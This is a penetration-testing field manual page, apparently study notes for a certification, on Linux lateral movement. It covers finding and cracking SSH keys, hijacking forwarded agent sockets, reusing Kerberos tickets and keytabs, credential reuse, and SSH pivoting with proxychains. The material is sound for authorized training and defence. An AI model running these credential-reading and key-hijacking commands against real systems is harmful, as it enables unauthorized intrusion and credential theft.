---
title: "Linux Lateral Movement"
description: "SSH keys and agent forwarding, Kerberos ccache/keytabs, shared credentials, and Linux trust paths."
category: "Field Manual"
tags: ["field-manual", "cpts", "linux", "lateral-movement", "ssh", "kerberos"]
date: 2026-11-11
published: true
status: archive
---

# Linux Lateral Movement

## SSH keys

```bash
find / -name id_rsa -o -name id_ed25519 2>/dev/null
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts
```

A private key without a passphrase is a direct login. With a passphrase:

```bash
ssh2john id_rsa > key.hash
john --wordlist=rockyou.txt key.hash
ssh -i id_rsa user@host
```

`known_hosts` reveals other hosts and sometimes usernames.

## SSH agent forwarding

If a user forwarded their agent (`ssh -A`), the socket is available in the environment:

```bash
echo $SSH_AUTH_SOCK
ssh-add -l
```

If you are root, use the socket to authenticate as the key owner:

```bash
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@next-host
```

This is a common lateral path on jump hosts.

## SSH config and history

```bash
cat ~/.ssh/config
cat ~/.bash_history
grep -R "ssh " /home 2>/dev/null
```

Config files contain hostnames, usernames, ports, and identity files.

## Kerberos

```bash
klist
ls -la /tmp/krb5cc_*
```

Use an existing ccache:

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
klist
impacket-smbclient -k -no-pass host.target.htb
```

Keytab:

```bash
kinit -k -t /etc/krb5.keytab
klist
```

Keytabs are often readable by service accounts or backups. Extract hashes with `klist -k` and crack if needed.

## Credential reuse

- Passwords from `web.config`, `.env`, database configs.
- Same local admin password across hosts.
- SSH keys copied to multiple servers.
- Ansible inventory/vault credentials.
- Docker registry credentials.
- CI/CD tokens with repository access.

Test carefully:

```bash
ssh user@host
nxc ssh host -u user -p pass
```

## Shared storage and services

- NFS home directories → read keys/history.
- SMB shares mounted on Linux (`mount.cifs`) → credentials in `/etc/fstab`.
- Databases with linked servers.
- Docker socket (`/var/run/docker.sock`) → host access.
- Kubernetes service account tokens.

## Pivoting from Linux

```bash
ssh -D 1080 -N -f user@host
ssh -L 8080:internal:80 user@host
ssh -R 4444:127.0.0.1:4444 user@host
```

Use `proxychains` for tools that do not support SOCKS natively:

```bash
proxychains nmap -sT -Pn -p 22,80,445 10.10.20.0/24
```

See [[pending/field-manual/05-lateral-movement/pivoting-and-tunneling|Pivoting and tunneling]].

## Cleanup

- Remove authorized keys you added.
- Delete temporary files and tunnels.
- Close SSH sessions and kill background processes.
- Remove any cron jobs or services you created.

## References

- [HackTricks — Linux lateral movement](https://book.hacktricks.wiki/en/linux-hardening/linux-post-exploitation/index.html)
- [HackTricks — SSH](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html)
- [Impacket](https://github.com/fortra/impacket)
